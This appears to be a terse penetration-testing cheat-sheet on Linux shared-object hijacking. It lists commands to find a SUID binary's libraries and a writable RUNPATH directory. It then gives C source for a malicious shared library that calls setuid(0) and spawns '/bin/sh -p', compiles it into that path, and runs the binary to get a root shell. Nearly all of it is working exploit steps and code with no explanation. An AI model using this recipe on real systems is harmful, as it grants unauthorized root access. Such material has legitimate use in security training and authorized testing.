# Shared Object Hijacking
```powershell
ls -la /path/to/suid_binary
ldd /path/to/suid_binary

./linpeas.sh | grep -A5 "Shared Library"

readelf -d payroll  | grep PATH

ldd payroll
  linux-vdso.so.1 (0x00007ffd22bbc000)
  libshared.so => /development/libshared.so (0x00007f0c13112000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

src.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}

gcc src.c -fPIC -shared -o /development/libshared.so

./payroll 
```
